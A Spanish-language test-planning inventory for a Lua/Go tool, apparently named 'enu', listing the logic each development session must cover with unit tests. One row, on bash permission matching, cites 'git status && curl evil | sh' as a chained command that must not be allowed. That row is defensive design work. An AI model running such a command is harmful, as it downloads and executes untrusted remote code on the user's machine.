---
title: "Inventario de lógica clave (tests unitarios obligatorios 🔒)"
description: "La lista 🔒 contra la que se audita una sesión antes de cerrarla: el caso exacto que cada test debe blindar."
type: "plan"
status: "vigente"
---
# Inventario de lógica clave (🔒 — tests unitarios obligatorios)

Estas sesiones implementan lógica que no puede quedar sin unitario, con el caso
exacto que cada test debe blindar. Es la lista contra la que se audita una
sesión antes de cerrarla:

| Sesión | Lógica clave a blindar |
|---|---|
| 🔒 **S02** | Forma de la tabla de error `{code,message,detail}`; un código reservado nunca se traga ni se reescribe. |
| 🔒 **S04** | El puente ⏸ goroutine-por-task + token Lua (ADR-011, cierra G31): suspensión por suelta/recupera del token; `pcall` y tail calls que envuelven un ⏸ sobreviven nativas; cero data races (`-race`). |
| 🔒 **S06** | `Future`: `set` una sola vez (segundo → `EINVAL`); varios `await` ven el valor ya resuelto. |
| 🔒 **S07** | `task.all` alinea `out[i]` con `fns[i]` (G27); `race` cancela a las perdedoras. |
| 🔒 **S08** | Desenrollado **no capturable** por `pcall` (§1.3); orden LIFO de `cleanup`; `ECANCELED` solo observable. |
| 🔒 **S09** | El watchdog corta el slice excedido y **no** se captura; emite `EBUDGET` + `core:plugin.misbehaved`. |
| 🔒 **S10** | Despacho sobre **foto** de suscriptores (G10); cancelar surte efecto inmediato; emits anidados **encolados** (anchura, no recursión). |
| 🔒 **S11** | Orden topológico por `requires`; unicidad de nombre (colisión = error); `init.lua` del usuario el último. |
| 🔒 **S13** | `reload` no deja handlers huérfanos (etiquetado por dueño, G2). |
| 🔒 **S14** | Escritura atómica (temporal+rename); `exclusive`=`O_EXCL` → `EEXIST` (G17); `stat` de inexistente → `nil`, no lanza. |
| 🔒 **S15** | Watcher: entrega **en lotes**, `debounce_ms`, filtrado `gitignore` (G7). |
| 🔒 **S16** | Vida del proceso: kill por `cleanup`; `alive` informa de existencia, no identidad (pid reciclado → `true`, G17). |
| 🔒 **S18** | `json` UTF-8 **estricto** → `EINVAL` (G11); sentinel `NULL` ida y vuelta sin perder claves. |
| 🔒 **S20** | **Parser SSE** de `Stream:events()` (eventos partidos entre chunks, `id`, comentarios); backpressure → `EIO`. |
| 🔒 **S22** | `text.width`: graphemes, east-asian, emoji ZWJ (la base de todo el layout). |
| 🔒 **S23** | `markdown` **streaming-safe**: entrada incompleta (bloque de código a medias) no rompe; el Block crece estable. |
| 🔒 **S25** | `diff`: hunks correctos en inserción/borrado/cambio y en los bordes. |
| 🔒 **S27** | `fuzzy` ordena por score de forma estable; `files` respeta `.gitignore`. |
| 🔒 **S29** | `blit` como **viewport**: offsets negativos y recorte por ambos extremos (G28); recorte de región fuera de pantalla en resize sin tocar coordenadas (G1). |
| 🔒 **S31** | Resolución de **secuencias** de teclas con timeout; pila de input (quien no consume, deja pasar). |
| 🔒 **S34** | `caps` **deny-by-default**, dos granularidades `"fs"` vs `"fs.read"` (G6); colas acotadas con backpressure. |
| 🔒 **S35** | Exclusividad `on_message`/`recv` → `EINVAL` en el acto (G8). |
| 🔒 **G42 (extensión)** | Reintento de la apertura del stream (agente.md §2): SOLO la apertura (a mitad de stream jamás), frontera exacta `max_retries`+1 aperturas, clasificación estricta `detail.retryable == true`, error propagado intacto (con el `retryable` que G43 alza a `agent:error`), cancel durante el backoff aborta sin reabrir. La MISMA política vive **duplicada** en el subagente-worker (herencia del padre incluida): blindar el motor no blinda la copia — tests propios (`agent_g42_test.go`, `agent_g42_worker_test.go`). |
| 🔒 **G53 (extensión)** | Tokenizador/máquina de estados de permisos de `bash` (`decompose_bash`/`match_bash`, agente.md §5, ADR-023): `allow` concede SOLO si CADA subcomando casa un patrón —`bash:git *` NO concede `git status && curl evil \| sh` (cierra la frontera falsa SEC-02)—; cada operador del contrato (`&&`, `\|\|`, `;`, `\|`, `\|&`, `&`, salto de línea) fuera de comillas separa; `deny` casa si ALGÚN subcomando casa (precedencia absoluta); todo constructo NO MODELABLE (`$( )`, backticks —también dentro de comillas dobles—, `$VAR` en posición de comando, redirecciones, heredocs, subshells/agrupaciones, comillas desbalanceadas) cae FAIL-CLOSED a `ask` (deny en headless), nunca concede (P17); el escape `\` no engaña al rastreador de separadores. El núcleo `deny→allow` se blinda table-driven en `_policy_decision` — tests propios (`agent_g53_test.go`). |
| 🔒 **G54 (kernel)** | Política de redirects del kernel HTTP (`withRedirectPolicy`/`isCrossHost`, api.md §8; sube `APILevel` a 4): presupuesto `max_redirects` respetado y, al agotarlo, la última `3xx` entregada como DATO (no lanza); `0` = no seguir ninguno; en cada salto **cross-host** (host distinto —nombre y puerto, plegando el default del esquema— o degradación `https`→`http`) se recortan TODAS las cabeceras del llamante, sin lista blanca y sin restaurarlas aunque un salto posterior regrese al host inicial; el upgrade same-host `http`→`https` NO es cross-host (redirect benigno); la política vive en una copia por petición del cliente (no muta el cliente compartido). Cubre `request` y `stream` — tests propios (`http_g54_test.go`). |
| 🔒 **G57 (kernel)** | `enu.fs.write{ mode }` fija el modo con chmod **no recortado por el umask** (sube `APILevel` a 5), en ambas direcciones (umask laxo no deja el fichero legible por otros; umask estricto no recorta un modo permisivo), componible con `exclusive`, y ganando sobre la preservación del previo en la sobrescritura; `opts.mode` inválido → `EINVAL`. La extensión `sessions` escribe transcript y lock en `0600` (`fs_test.go`; e2e `sessions_test.go`/`chat_test.go` des-amañados: aserción de modo real bajo el umask heredado). |
| 🔒 **S49** | `enu init` **jamás sobrescribe** un fichero de config existente, en ningún modo ni con `--yes` (pérdida silenciosa de config del usuario = el fallo de borde); semántica por fichero: sobre config parcial escribe exactamente los que faltan; `init --yes`/sin-TTY y `--default-config` producen bytes idénticos (la equivalencia de ADR-026 pieza 2 es un contrato, no una intención); códigos 0 (éxito/no-op), 1, 2. |
| 🔒 **S50** | `enu doctor`: cada check KERNEL de `doctor.v1` tiene caso verde y caso rojo table-driven (los 4 de producto son `skip` fijo en v1, G62); exit 1 si CUALQUIER check falla (y 0 con `skip`s presentes — los `skip` no ensucian); el valor de la clave **jamás** aparece en ninguna salida (humana ni `--json`, ni en `detail`/`remedy` — la fuga de secretos es el fallo silencioso perfecto); el `--json` valida contra el esquema congelado en doctor.md. |
| 🔒 **S51** | Verificación de checksum en **Go compartido** (`update` + la que consume `install.sh`): artefacto corrupto o `checksums.txt` ausente → no se toca el binario instalado (instalar un binario corrupto es el fallo silencioso por antonomasia); reemplazo atómico del binario **en uso** (escribir-al-lado + rename; bordes ETXTBSY/cross-device); reinstalar la misma versión = no-op honesto; `uninstall` nunca toca `data_dir()`; destino no escribible → aborta con remedio, jamás eleva privilegios. |
| 🔒 **S54** | Máquina de estados de la elección en la pantalla desnuda (menú ↔ selección de catálogo): **re-entrada** — una segunda pulsación de activar con el `activateAndBoot` en curso NO dispara otro (doble escritura de `enu.toml`/doble `Boot` es el fallo silencioso); cursor **acotado** a los límites del catálogo (catálogo vacío incluido, sin índice fuera de rango); la acción 1 activa **exactamente** `officialProductSet` (ADR-015: `example` fuera) y la 2 escribe **solo** la embebida elegida; fallo de activación (`enu.toml` malformado → `EINVAL` sin pisar el fichero, G21/S33; `Boot` roto) deja la pantalla viva con el error accionable y la salida por teclado operativa (ADR-017: la terminal jamás queda atrapada en raw mode). |

Las sesiones **fuera** de esta lista (S01, S03, S05, S12, S17, S19, S21, S24,
S26, S28, S30, S32, S33 y las de extensiones Lua de la Fase 8) se cierran con
snippet + checkpoint; si al implementarlas aparece lógica propia no trivial, se
añaden aquí — el inventario crece, nunca se relaja.
